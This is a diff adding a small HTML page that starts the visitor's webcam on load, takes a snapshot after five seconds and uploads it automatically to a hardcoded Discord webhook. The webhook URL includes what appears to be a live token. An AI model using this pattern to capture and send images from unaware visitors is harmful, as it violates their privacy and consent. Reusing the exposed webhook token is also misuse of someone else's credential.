@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Auto Snapshot to Discord</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        video {
+            border: 2px solid #007bff;
+            border-radius: 5px;
+            width: 640px; /* Adjust the width */
+            height: 480px; /* Adjust the height */
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Camera Auto Snapshot Example</h1>
+    <video id="video" autoplay></video>
+
+    <script>
+        const video = document.getElementById('video');
+        let videoStream;
+
+        // Function to start the camera and capture a snapshot
+        async function startCameraAndCapture() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = videoStream;
+
+                // Delay before capturing a snapshot
+                setTimeout(async () => {
+                    const snapshot = await takeSnapshot();
+                    await sendToDiscordWebhook(snapshot);
+                }, 5000); // Change this delay (in milliseconds) as needed
+            } catch (error) {
+                console.error("Error accessing the camera", error);
+                alert("Could not access the camera. Please check your permissions.");
+            }
+        }
+
+        // Function to take a snapshot
+        async function takeSnapshot() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        // Function to send the snapshot to Discord webhook
+        async function sendToDiscordWebhook(base64Image) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1274537207830413485/_bfA_kZWvA5ZxWX4sHQkTTc8gf6wrHa7b2m_Hmi9gobNyPv01DKe6aRtlKMsmUrbJq-Y'; // Replace with your webhook URL
+            const blob = dataURLtoBlob(base64Image);
+            
+            const formData = new FormData();
+            formData.append('content', 'Here\'s a snapshot from the webcam!');
+            formData.append('file', blob, 'snapshot.jpg');
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log('Snapshot sent successfully to Discord!');
+                    alert('Snapshot sent successfully!');
+                } else {
+                    console.error('Error sending snapshot:', response.statusText);
+                    alert('Error sending snapshot: ' + response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending snapshot to Discord:', error);
+                alert('Error sending snapshot: ' + error.message);
+            }
+        }
+
+        // Function to convert data URL to Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new Uint8Array(byteString.length);
+            for (let i = 0; i < byteString.length; i++) {
+                ab[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Start the whole process
+        startCameraAndCapture();
+    </script>
+</body>
+</html>
